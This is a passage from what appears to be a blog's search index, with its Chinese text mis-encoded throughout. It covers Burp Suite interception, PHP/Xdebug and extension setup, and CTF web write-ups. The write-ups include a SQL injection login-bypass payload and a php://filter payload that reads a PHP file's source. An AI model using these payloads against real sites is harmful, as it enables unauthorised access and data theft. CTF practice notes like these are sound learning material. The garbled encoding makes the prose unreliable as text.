(1)ä¼ å‚çº¦å®š\n\n- 32ä½ï¼šEBXã€ECXã€EDXã€ESIã€EDIã€EBP\n- 64ä½ï¼šRDIã€RSIã€RDï¼¸ã€R10ã€R8ã€R9\n","tags":["kernelç¬”è®°æ±‡æ€»"],"categories":["kernel","kernelç¬”è®°æ±‡æ€»"]},{"title":"Burpsuiteä½¿ç”¨","url":"/2022/01/09/Burpsuiteä½¿ç”¨/","content":"\n\n\n\n\n# ä¸€ã€é…ç½®\n\n## 1.é…ç½®æµè§ˆå™¨ä»£ç†\n\n### (1)å®‰è£…\n\nEdgeå®‰è£…æ’ä»¶Proxy SwitchyOmega\n\n### (3)è®¾ç½®\n\nè¿›å…¥é€‰é¡¹\n\n![image-20220109124055943](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091240977.png)\n\né…ç½®å¦‚ä¸‹\n\n![image-20220109124123157](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091241223.png)\n\n## 2.é…ç½®BurpSuite\n\nProxy->Options\n\n![image-20220109124203603](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091242646.png)\n\næ²¡æœ‰çš„å¯ä»¥ç‚¹æ—è¾¹çš„AddæŒ‰é’®æ·»åŠ ã€‚\n\n\n\n\n\n# äºŒã€ä½¿ç”¨\n\n## 1.æŠ“åŒ…\n\n### (1)Edgeæµè§ˆå™¨å¼€å¯ä»£ç†\n\n![image-20220109180624711](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091806742.png)\n\né€‰ä¸­å¦‚å›¾ä»£ç†\n\nç„¶åç»§ç»­ç‚¹å‡»ç½‘é¡µ\n\n### (2)Burpsuiteå¼€å¯\n\nBurpsuitä¸­\n\nProxy->Interceptå¤„ï¼Œå¦‚æœç‚¹å‡»å¦‚ä¸‹æŒ‰é’®\n\n![image-20220109180945990](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091809028.png)\n\né‚£ä¹ˆæ¯æ¥æ”¶ä¸€ä¸ªåŒ…ï¼ŒBurpSuiteéƒ½ä¼šæ‹¦æˆªï¼Œéœ€è¦ç‚¹å‡»Frowardç»§ç»­ï¼Œæˆ–è€…ä¸¢å¼ƒDropè¯¥åŒ…ï¼Œé¡µé¢æ‰ä¼šç»§ç»­åŠ è½½ã€‚\n\nç„¶ååˆ°Target->Site mapå¤„ï¼Œå³å¯çœ‹åˆ°æ‹¦æˆªçš„æ–‡ä»¶\n\n![image-20220109181204449](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091812502.png)\n\n\n\n## 2.æ”¹åŒ…\n\n### (1)å…ˆæŠ“åŒ…\n\né¦–å…ˆæµè§ˆå™¨å¼€å¯ä»£ç†ï¼ŒBurpSuiteæŠ“åˆ°åŒ…\n\n![image-20220111141339457](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111424692.png)\n\n### (2)å‘é€åˆ°Repeater\n\nç„¶åå°†åŒ…å‘é€åˆ°`repeater`\n\n![image-20220111141424655](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111424737.png)\n\nåœ¨Repeateræœ€æ–°å‡ºç°çš„ä¸€éƒ¨åˆ†å°±æ˜¯\n\n![image-20220111141531436](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111424733.png)\n\nä¿®æ”¹ç„¶åä½¿ç”¨ç‚¹å‡»Goå³å¯å‘é€ä¿®æ”¹ä¹‹åçš„åŒ…ï¼ŒResponseæ¥æ”¶åé¦ˆçš„åŒ…å¹¶è§£æ\n\n","tags":["Burpsuiteä½¿ç”¨"],"categories":["Burpsuiteä½¿ç”¨"]},{"title":"PHPç¯å¢ƒæ­å»º","url":"/2022/01/06/PHPç¯å¢ƒæ­å»º/","content":"\n# ä¸€ã€è°ƒè¯•æ­å»º\n\n## ğŸ”ºWindowsç‰ˆæœ¬\n\n## 1.å‰ç½®å®‰è£…\n\nphpstorm+phpStudy\n\nè¿™ä¸¤ä¸ªéœ€è¦å…ˆè£…å¥½ï¼Œä¹‹ååˆ©ç”¨phpStudyä¸­è‡ªå¸¦çš„xdebugæ¥è°ƒè¯•\n\n## 2.phpStudyè®¾ç½®\n\n### (1)phpç‰ˆæœ¬\n\nè¿™é‡Œæˆ‘çš„phpé€‰æ‹©çš„æ˜¯å¦‚ä¸‹\n\n![image-20220107105326110](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071053181.png)\n\n### (2)æ‰“å¼€xdebug\n\nå•å‡»è®¾ç½®->æ‰©å±•ç»„ä»¶ï¼Œè®¾ç½®å¦‚ä¸‹\n\n![image-20220107105424985](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071054040.png)\n\n### (3)ä¿®æ”¹php.ini\n\nç„¶åä¸»ç•Œé¢è®¾ç½®->php.ini->å•å‡»å¯¹åº”ç‰ˆæœ¬ï¼Œå³å¯æ‰“å¼€php.inié…ç½®æ–‡ä»¶\n\n![image-20220107105552036](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071055085.png)\n\næ‰“å¼€ä¹‹åï¼Œåœ¨æœ€ä¸‹é¢çš„xdebugè®¾ç½®å¦‚ä¸‹\n\n```\n[Xdebug]\nxdebug.idekey = PHPSTORM\nzend_extension=D:/phpstudy_pro/Extensions/php/php7.3.4nts/ext/php_xdebug.dll\nxdebug.collect_params=1\nxdebug.collect_return=1\nxdebug.auto_trace=On\nxdebug.trace_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.trace\nxdebug.profiler_enable=On\nxdebug.profiler_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.profiler\nxdebug.remote_enable=On\nxdebug.remote_host=localhost\nxdebug.remote_port=9000\nxdebug.remote_handler=dbgp\n```\n\nè¿™é‡Œå‚è€ƒhttps://www.cnblogs.com/baocheng/p/5775938.html  ç›¸å…³çš„ä¼šæ›´åŠ è¯¦ç»†ã€‚\n\nä¸»è¦æ˜¯è®¾ç½®`xdebug.remote_handler`ï¼Œ`xdebug.remote_port`ï¼Œ`xdebug.remote_host`ï¼Œ`xdebug.profiler_enable`ï¼Œ`xdebug.idekey`ï¼Œ`xdebug.remote_enable`\n\n### (4)ç½‘ç«™è·¯å¾„è®¾ç½®\n\nä¸»ç•Œé¢ç½‘ç«™->ç®¡ç†->ä¿®æ”¹->æ ¹ç›®å½•ï¼Œç„¶åè®¾ç½®ä¸ºåœ¨phpStormä¸­å­˜æ”¾phpæ–‡ä»¶çš„ç›®å½•ï¼Œæ²¡æœ‰çš„å¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ª\n\n![image-20220107111415751](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071114807.png)\n\n### (5)å¼€å¯æœåŠ¡\n\nphpStudyä¸­å¼€å¯å¯¹åº”çš„ç½‘ç«™æœåŠ¡å³å¯\n\n![image-20220107112835096](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071128163.png)\n\n## 3.phpstormè®¾ç½®\n\n### (1)PHPç‰ˆæœ¬é€‰æ‹©\n\nç‰ˆæœ¬é€‰æ‹©ä¹‹å‰æˆ‘ä»¬çš„è®¾ç½®å¥½çš„ç›¸å…³ç‰ˆæœ¬\n\n![image-20220107110300128](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071103174.png)\n\nè¿™é‡Œçš„CLI interpreteréœ€è¦é€‰æ‹©phpStudyä¸­çš„phpï¼Œç‚¹å‡»æ—è¾¹çš„`...`æŒ‰é’®ï¼Œæ‰¾åˆ°å¯¹åº”çš„php.exeæ·»åŠ å³å¯ï¼Œå¤§å¤šçš„è·¯å¾„å¦‚ä¸‹\n\n![image-20220107110410950](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071104002.png)\n\n### (2)xdebugé…ç½®\n\næ‰“å¼€phpstormï¼Œæ‰“å¼€setting->PHP->Debugï¼Œxdebugé…ç½®å¦‚ä¸‹ï¼Œä¸»è¦æ˜¯ç«¯å£å¯¹åº”\n\n![image-20220107110012400](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071100474.png)\n\nPHP->Debug->DBGp Proxyï¼Œè¿›è¡Œç›¸å…³è®¾ç½®\n\n![image-20220107110614445](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071106492.png)\n\n\n\n### (3)æœåŠ¡å™¨ç«¯é…ç½®\n\nsetting->server\n\n![image-20220107110138638](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071101687.png)\n\næ²¡æœ‰çš„è‡ªè¡Œ+å·æ·»åŠ ï¼Œåå­—è‡ªå·±å®šä¹‰\n\n### (4)é…ç½®phpæ–‡ä»¶è·¯å¾„\n\nRun->Edit Configurations\n\n![image-20220107110807337](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071108373.png)\n\nç„¶åæ·»åŠ å¯¹åº”çš„è°ƒè¯•è·¯å¾„\n\n![image-20220107111003896](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071110934.png)\n\nå¯¹åº”è®¾ç½®\n\n![image-20220107111151592](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071111653.png)\n\n## 4.å¼€å§‹è°ƒè¯•\n\nç„¶ååœ¨phpStormä¸­å¯¹åº”ç½‘ç«™çš„ç›®å½•ä¸‹çš„æ–‡ä»¶å³å¯ä¸‹æ–­ç‚¹å¼€å§‹è°ƒè¯•\n\n### (1)å¼€å§‹ç›‘å¬\n\n![image-20220107111554195](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071115224.png)\n\nè®¾ç½®å¥½è°ƒè¯•ç¯å¢ƒï¼Œç„¶åç‚¹æ—è¾¹çš„ç”µè¯ï¼Œä½¿å…¶å˜æˆå¦‚ä¸‹\n\n![image-20220107111631356](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071116386.png)\n\n### (2)è°ƒè¯•\n\nåœ¨æ–‡ä»¶ä¸­ä¸‹æ–­ç‚¹ï¼Œç‚¹å‡»debugå³å¯å¼€å§‹è°ƒè¯•\n\n![image-20220107112446079](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071124166.png)\n\n\n\n## ğŸ”ºLinuxç‰ˆæœ¬\n\n## 1.å‰ç½®å®‰è£…\n\nç”¨çš„ä¹Ÿæ˜¯PHPSTORMå’Œå®å¡”linux\n\n## 2.å®å¡”linuxè®¾ç½®\n\n### (1)å®‰è£…xdebug\n\nå®‰è£…å¥½PHPä¹‹åï¼Œè®¾ç½®å®‰è£…PHPçš„æ‹“å±•\n\n![image-20220113110140841](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131101953.png)\n\n### (2)é…ç½®php.ini\n\n![image-20220113110241556](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131102613.png)\n\n```\n[XDebug]\n; å…è®¸è¿œç¨‹ å¯ä»¥ä¸º On æˆ–è€… 1 éƒ½è¡¨ç¤ºå¯ç”¨ ï¼Œ Off å’Œ 0 è¡¨ç¤ºå…³é—­å…³é—­\nxdebug.remote_enable = On\n; è¿œç¨‹ä¸»æœºçš„ IP è¿™é‡Œæˆ‘ä»¬å¡«å†™ï¼Œå›ºå®šçš„ 127.0.0.1 è¿™é‡Œå†™çš„æ˜¯PHPSTORMæ‰€åœ¨çš„é‚£å°æœºå™¨ä¸Šçš„IP\nxdebug.remote_host = 127.0.0.1\n; è°ƒè¯•è¿æ¥ç«¯å£ è¯·è®°ä½è¿™ä¸ªç«¯å£ï¼Œåç»­ä¼šç”¨åˆ°ã€‚æ­¤é…ç½®é¡¹é»˜è®¤å€¼ä¸º 9000 ï¼Œä½†æ˜¯é€šå¸¸ 9000 ç«¯å£è¢« fpm å æ® ï¼Œæ•…æ›´æ¢ç«¯å£ã€‚\n; å¦å¤–ï¼Œè¯·åœ¨ä½ æœåŠ¡å™¨çš„æ§åˆ¶é¢æ¿å’ŒæœåŠ¡å™¨é˜²ç«å¢™ä¸­å¼€æ”¾è¿™ä¸ªç«¯å£çš„è¿›å‡ºç«™ã€‚\n; å¦‚æœä½ æ˜¯å®å¡”é¢æ¿ç”¨æˆ· è¯·æ”¾è¡Œæ­¤ç«¯å£ã€‚\nxdebug.remote_port = 9001\n; æ¥ä¸‹æ¥çš„å€¼éƒ½æ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯æˆ‘æ¨èä½ ä½¿ç”¨\n; è¿æ¥ IDE çš„ Keyï¼Œè¯·è®°ä½ä»–ï¼Œå¯ä»¥è‡ªå·±è‡ªå®šä¹‰ï¼Œä¸»è¦ç”¨æ¥è¿‡æ»¤è¯·æ±‚ã€‚\nxdebug.idekey=PHPSTORM\nxdebug.remote_handler=dbgp\nxdebug.collect_params=1\nxdebug.collect_return=1\nxdebug.auto_trace=On\nxdebug.profiler_enable=On\n```\n\nå‚ç…§\n\n[Linuxå†…ç½‘æœåŠ¡å™¨+å®å¡”+Xdebugè¿œç¨‹è°ƒè¯•é…ç½® â€“ T1h2ua's Blog](https://www.t1h2ua.cn/archives/69)\n\nä¿å­˜ä¹‹åï¼Œé‡è½½ä¸€ä¸‹é…ç½®\n\n![image-20220113110410355](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131104394.png)\n\n### (3)ç½‘ç«™è·¯å¾„è®¾ç½®\n\nå®å¡”Linuxä¸­ç‚¹å‡»ç½‘ç«™ï¼Œæ·»åŠ ç«™ç‚¹\n\n![image-20220113110540548](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131105621.png)\n\nå¾—åˆ°å¦‚ä¸‹\n\n![image-20220113110610661](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131106699.png)\n\n### (4)å¼€å¯æœåŠ¡\n\nè®°å¾—æŠŠå¯¹åº”çš„æœåŠ¡æ‰“å¼€ï¼Œnginx/apacheå’Œphp\n\n![image-20220113110735466](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131107520.png)\n\n### (5)æ”¾è¡Œ9001ç«¯å£\n\n![image-20220113111553907](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131115950.png)\n\n\n\n## 3.phpStormè®¾ç½®\n\nè¿™é‡Œå°±éƒ½å·®ä¸å¤šï¼Œé€‰æ‹©phpç‰ˆæœ¬ï¼Œé…ç½®xdebugï¼Œé…ç½®Serverï¼Œé…ç½®phpæ–‡ä»¶è·¯å¾„ï¼Œæ³¨æ„è¿™é‡Œé€‰å–çš„ç«¯å£ä¸º9001\n\n![image-20220113110926412](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109452.png)\n\n![image-20220113111016050](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110087.png)\n\n![image-20220113110938531](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109570.png)\n\n![image-20220113111029912](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110947.png)\n\n![image-20220113111210749](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131112793.png)\n\nç„¶åå°±å¯ä»¥è°ƒè¯•äº†ã€‚\n\n## ğŸ”ºæ³¨ï¼š\n\nxdebug3.0ä»¥ä¸Šçš„ï¼Œé…ç½®æœ‰ç‚¹å˜åŒ–ï¼Œå¦‚ä¸‹\n\n```\n[XDebug]\nxdebug.mode = develop,debug\nxdebug.start_with_request = default|default\n;xdebug.start_with_request = yes ;å½“æ”¹ä¸ºyesæ—¶æ‰€æœ‰è¯·æ±‚éƒ½ä¼šèµ°debugï¼Œä¸éœ€è¦è®¾ç½®idekey \nxdebug.client_host = 127.0.0.1 \nxdebug.client_port = 9001\nxdebug.remote_handler = dbgp\nxdebug.idekey = PHPSTORM\nxdebug.cli_color = 2\nxdebug.var_display_max_depth = 15\nxdebug.var_display_max_data  = 2048\n```\n\n\n\n# äºŒã€æ•°æ®åº“æ­å»º\n\n## 1.phpStudyè®¾ç½®\n\n### (1)åˆ›å»ºæ•°æ®åº“\n\nè®¾ç½®æ•°æ®åº“ï¼Œæ²¡æœ‰å°±åˆ›å»ºï¼Œé¼ æ ‡ç¢°åˆ°å¯†ç å¯ä»¥æŸ¥çœ‹\n\n![image-20220109115051455](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091150517.png)\n\n### (2)æ‰“å¼€MySQLæ•°æ®åº“\n\n![image-20220109115216201](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091152262.png)\n\n## 2.phpStormè®¾ç½®\n\n### (1)è®¾ç½®\n\nview->Tool Windows->databases\n\n![image-20220109115314160](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153202.png)\n\nç„¶ååˆ›å»ºä¸€ä¸ªè¿æ¥\n\n![image-20220109115352472](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153527.png)\n\n![image-20220109115418414](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154448.png)\n\nå¯¹åº”è¾“å…¥hostï¼Œè´¦å·å¯†ç å³å¯\n\n![image-20220109115447217](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154268.png)\n\n### (2)æŸ¥çœ‹æ§åˆ¶\n\n![image-20220109115523944](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091155976.png)\n\nview->tool windows->databaseä¹‹åï¼ŒåŒå‡»ä¸Šé¢çº¢æ¡†å¯ä»¥è¿›å…¥æ§åˆ¶ç•Œé¢\n\n![image-20220109115615823](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091156880.png)\n\nç„¶åå°±æ­£å¸¸äº†ã€‚\n\n\n\n\n\n# ä¸‰ã€PHPæ¨¡å—æ­å»º\n\n## 1.åˆ›å»ºæ¨¡å—æ¨¡æ¿\n\næ‰¾åˆ°phpæºç ç›®å½•\n\n![image-20220210174644261](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202101746346.png)\n\nç„¶åä½¿ç”¨`ext_skel`åˆ›å»ºä¸€ä¸ªæ¨¡æ¿\n\n```\n./ext_skel --extname=helloworld\n```\n\n## 2.ç¼–è¯‘æ¨¡å—\n\néšåè¿›è¡Œç¼–è¯‘ï¼Œè·³è½¬åˆ°åˆšåˆšç”Ÿæˆçš„æ¨¡å—æ–‡ä»¶å¤¹è·¯å¾„`/path_to_php_src/ext/helloworld`ï¼Œç„¶åç¼–è¯‘\n\n```\n/www/server/php/56/bin/phpize\n./configure  --with-php-config=/www/server/php/56/bin/php-config\n```\n\nè¿™é‡Œéœ€è¦æŒ‡å®šä¸€ä¸‹`--with-php-config`ï¼Œé€‰æ‹©è‡ªå·±çš„`php-config`ï¼Œå½“ç„¶å¦‚æœæœ¬åœ°çš„ç¯å¢ƒå˜é‡binå‘½ä»¤ä¸‹ç›´æ¥æœ‰`php-config`ä¹Ÿä¸ç”¨æŒ‡å®šäº†ï¼Œéšå\n\n```\nmake\n```\n\nè¿™æ ·å°±å¯ä»¥åœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆäº†\n\n![image-20220210175900511](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202101759576.png)\n\nå…¶ä¸­`helloworld.c`å³ä¸ºåˆ›å»ºçš„æ¨¡æ¿ä»£ç ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆ5.6ç‰ˆæœ¬çš„ç¼–è¯‘å®Œæˆåï¼Œä¸ç”Ÿæˆ.soæ¨¡å—æ–‡ä»¶ï¼Œå¯èƒ½æ˜¯ç‰ˆæœ¬ç‰¹æ€§ï¼Ÿ\n\n```C\n/* helloword extension for PHP */\n\n#ifdef HAVE_CONFIG_H\n# include \"config.h\"\n#endif\n\n#include \"php.h\"\n#include \"ext/standard/info.h\"\n#include \"php_helloword.h\"\n\n/* For compatibility with older PHP versions */\n#ifndef ZEND_PARSE_PARAMETERS_NONE\n#define ZEND_PARSE_PARAMETERS_NONE() \\\n\tZEND_PARSE_PARAMETERS_START(0, 0) \\\n\tZEND_PARSE_PARAMETERS_END()\n#endif\n\n/* {{{ void helloword_test1()\n */\nPHP_FUNCTION(helloword_test1)\n{\n\tZEND_PARSE_PARAMETERS_NONE();\n\n\tphp_printf(\"The extension %s is loaded and working!\\r\\n\", \"helloword\");\n}\n/* }}} */\n\n/* {{{ string helloword_test2( [ string $var ] )\n */\nPHP_FUNCTION(helloword_test2)\n{\n\tchar *var = \"World\";\n\tsize_t var_len = sizeof(\"World\") - 1;\n\tzend_string *retval;\n\n\tZEND_PARSE_PARAMETERS_START(0, 1)\n\t\tZ_PARAM_OPTIONAL\n\t\tZ_PARAM_STRING(var, var_len)\n\tZEND_PARSE_PARAMETERS_END();\n\n\tretval = strpprintf(0, \"Hello %s\", var);\n\n\tRETURN_STR(retval);\n}\n/* }}}*/\n\n/* {{{ PHP_RINIT_FUNCTION\n */\nPHP_RINIT_FUNCTION(helloword)\n{\n#if defined(ZTS) && defined(COMPILE_DL_HELLOWORD)\n\tZEND_TSRMLS_CACHE_UPDATE();\n#endif\n\n\treturn SUCCESS;\n}\n/* }}} */\n\n/* {{{ PHP_MINFO_FUNCTION\n */\nPHP_MINFO_FUNCTION(helloword)\n{\n\tphp_info_print_table_start();\n\tphp_info_print_table_header(2, \"helloword support\", \"enabled\");\n\tphp_info_print_table_end();\n}\n/* }}} */\n\n/* {{{ arginfo\n */\nZEND_BEGIN_ARG_INFO(arginfo_helloword_test1, 0)\nZEND_END_ARG_INFO()\n\nZEND_BEGIN_ARG_INFO(arginfo_helloword_test2, 0)\n\tZEND_ARG_INFO(0, str)\nZEND_END_ARG_INFO()\n/* }}} */\n\n/* {{{ helloword_functions[]\n */\nstatic const zend_function_entry helloword_functions[] = {\n\tPHP_FE(helloword_test1,\t\targinfo_helloword_test1)\n\tPHP_FE(helloword_test2,\t\targinfo_helloword_test2)\n\tPHP_FE_END\n};\n/* }}} */\n\n/* {{{ helloword_module_entry\n */\nzend_module_entry helloword_module_entry = {\n\tSTANDARD_MODULE_HEADER,\n\t\"helloword\",\t\t\t\t\t/* Extension name */\n\thelloword_functions,\t\t\t/* zend_function_entry */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MINIT - Module initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_MSHUTDOWN - Module shutdown */\n\tPHP_RINIT(helloword),\t\t\t/* PHP_RINIT - Request initialization */\n\tNULL,\t\t\t\t\t\t\t/* PHP_RSHUTDOWN - Request shutdown */\n\tPHP_MINFO(helloword),\t\t\t/* PHP_MINFO - Module info */\n\tPHP_HELLOWORD_VERSION,\t\t/* Version */\n\tSTANDARD_MODULE_PROPERTIES\n};\n/* }}} */\n\n#ifdef COMPILE_DL_HELLOWORD\n# ifdef ZTS\nZEND_TSRMLS_CACHE_DEFINE()\n# endif\nZEND_GET_MODULE(helloword)\n#endif\n\n```\n\n## ğŸ”ºæ³¨ï¼š\n\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨php7.3ä»¥ä¸Šï¼Œ`ext_skel`è¿™ä¸ªshellå˜æˆäº†`ext_skel.php`ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹æ¥åˆ›å»º\n\n```\n/www/server/php/73/bin/php ./ext_skel.php --ext helloword\n/www/server/php/73/bin/phpize\n./configure --prefix=/www/server/php/73/bin/php --with-php-config=/www/server/php/73/bin/php-config\nmake\n```\n\n## 3.åŠ è½½æ¨¡å—\n\n### æ–¹æ³•ä¸€ï¼š\n\nç›´æ¥`make install`ï¼Œç„¶ååœ¨å¯¹åº”çš„php.iniä¸­æ·»åŠ `extension=helloword.so`\n\n### æ–¹æ³•äºŒï¼š\n\nå¤åˆ¶modulesä¸‹çš„helloworld.soæ¨¡å—åˆ°å¯¹åº”çš„phpæ‰©å±•ç›®å½•\n\n```\ncp ./modules/helloword.so /www/server/php/73/lib/php/extensions/no-debug-non-zts-20180731/\n```\n\nåŒæ ·ä¹Ÿå¾—åœ¨php.iniä¸­æ·»åŠ extension\n\nä¹‹åä½¿ç”¨æ¨¡æ¿ä¸­å‡½æ•°æµ‹è¯•å³å¯\n\n```\n<?php\nhelloword_test1();\n?>\n```\n\nå¦‚ä¸‹å³å¯æˆåŠŸ\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202101910792.png)\n\nè¿™ä¸ªphpæ‹“å±•æ¨¡å—å…¶å®è·Ÿlinuxå†…æ ¸æœ‰ç‚¹åƒ\n\n","tags":["PHPç¯å¢ƒæ­å»º"],"categories":["PHPç¯å¢ƒæ­å»º"]},{"title":"é™ªXXçš„WebBUUåˆ·é¢˜(ä¸€)","url":"/2022/01/06/é™ªXXçš„WebBUUåˆ·é¢˜(ä¸€)/","content":"\n# ä¸€ã€EasySQL\n\n## ğŸ”ºSQLæ³¨å…¥ç™»å½•\n\nç®€å•çš„SQLæ³¨å…¥\n\n## 1.æŸ¥çœ‹ç½‘é¡µæºä»£ç \n\n![image-20220106105755040](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346044.png)\n\nå¯ä»¥çœ‹åˆ°æ˜¯check.phpåœ¨å¯¹ç™»å½•æŒ‰é’®è¿›è¡Œæ“ä½œï¼Œä½¿ç”¨çš„æ–¹æ³•æ˜¯GETï¼ŒåŠ ä¸Šé¢˜ç›®æç¤ºæ˜¯SQLæ³¨å…¥ï¼Œæ‰€ä»¥å°±ç›´æ¥å°è¯•SQLæ³¨å…¥ã€‚\n\n## 2.æ³¨å…¥åŸç†\n\nç”±äºSQLæ³¨å…¥ä¸­æ¶‰åŠå•å¼•å·å’ŒåŒå¼•å·ï¼Œä¸”å¯¹å­—ç¬¦ä¸²çš„å¤„ç†åŸºæœ¬éƒ½æ˜¯å•å¼•å·è¿›è¡Œå¤„ç†ï¼Œæ£€æµ‹ä¸€ä¸‹ï¼Œå€˜è‹¥æˆ‘ä»¬ä½¿ç”¨åŒå¼•å·è¿›è¡Œæ³¨å…¥\n\n```\ncheck.php?username=aaa' or \"1\"=\"1&password=aaa' or \"1\"=\"1\n```\n\né‚£ä¹ˆå‡ºç°å¦‚ä¸‹é”™è¯¯\n\n![image-20220106110800649](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061346998.png)\n\né‚£ä¹ˆé‡‡ç”¨å•å¼•å·è¿›è¡Œæ³¨å…¥\n\n```\ncheck.php?username=aaa' or '1'='1&password=aaa' or '1'='1\n```\n\nä¹‹åå³å¯æˆåŠŸ\n\n![image-20220106142353692](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201061423772.png)\n\n\n\n# äºŒã€\n\n1.HTMLæ ‡ç­¾\n\nmetaæ ‡ç­¾\n\n\n\n\n\n# ä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun1\n\n## ğŸ”ºç®€å•æŸ¥è¯¢\n\næŸ¥çœ‹æºä»£ç ï¼Œè·³è¿‡csså’Œstyleéƒ¨åˆ†\n\nå¯ä»¥çœ‹åˆ°æ³¨é‡Šéƒ¨åˆ†çš„æç¤º\n\n![image-20220107114730804](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071147850.png)\n\nå³å½“cat=dogæ—¶ï¼Œå°±ä¼šè¾“å‡ºSyc{cat_cat_cat}ï¼Œä½†æ˜¯ä¸€èˆ¬è¿™éƒ½æ˜¯ä½œè€…ç»™çš„æç¤ºï¼Œå®é™…è¾“å‡ºå†…å®¹å¯èƒ½ä¸æ˜¯Syc{cat_cat_cat}ï¼Œæ‰€ä»¥å…ˆå°è¯•ä¸€æ³¢\n\n```\nurl/index.php?cat=dog\n```\n\nç›´æ¥å‡ºflagäº†\n\n![image-20220107114926958](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071149004.png)\n\n\n\n# å››ã€[ACTF2020 æ–°ç”Ÿèµ›]Include\n\n## ğŸ”ºPHPä¼ªåè®®\n\n## 1.å‰ç½®æ¢ç´¢\n\nç‚¹å‡»tipsä¹‹åå‘ç°è¾“å‡ºæç¤ºï¼Œè·å–åˆ°ä½¿ç”¨fileåè®®çš„flag.php\n\n![image-20220107120937019](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071209055.png)\n\næŸ¥çœ‹flag.phpçš„ç½‘é¡µæºä»£ç ä½†æ˜¯ä»€ä¹ˆä¹Ÿæ²¡æœ‰\n\n![image-20220107121010226](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071210256.png)\n\nä¹‹åå°è¯•åˆ©ç”¨phpçš„ä¼ªåè®®æ¥è¯»å–flag.phpçš„æºä»£ç \n\n## 2.phpä¼ªåè®®åˆ©ç”¨\n\nè¿™ä¸ªæ¯”è¾ƒå¤æ‚ï¼Œä¹‹åå†ä¸“é—¨æ€»ç»“ä¸€ä¸‹ï¼Œåæ­£è¿™é‡Œæ¶‰åŠäº†fileï¼Œé‚£ä¹ˆå°è¯•ç”¨è¯¥åè®®çš„payloadæ¥è¯»å–\n\n```\n/?file=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\nè¿™é‡Œç»™å‡ºçš„æ˜¯æ¯”è¾ƒæ™®éæ€§çš„ï¼Œç”¨base64æ¥è¿›è¡Œè·å–çš„ï¼Œè¯»å–ä¹‹åå¾—åˆ°base64ç¼–ç çš„ä¸€ä¸²å­—ç¬¦\n\n![image-20220107121629962](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071216007.png)\n\n## 3.base64è§£ç \n\nè·å–åˆ°ä¸Šé¢çš„base64ç¼–ç åï¼Œè¿ç”¨CyberChefè§£ç å³å¯å¾—åˆ°flag\n\n![image-20220107121805266](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071218337.png)\n\n\n\n# äº”ã€[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨1\n\n## 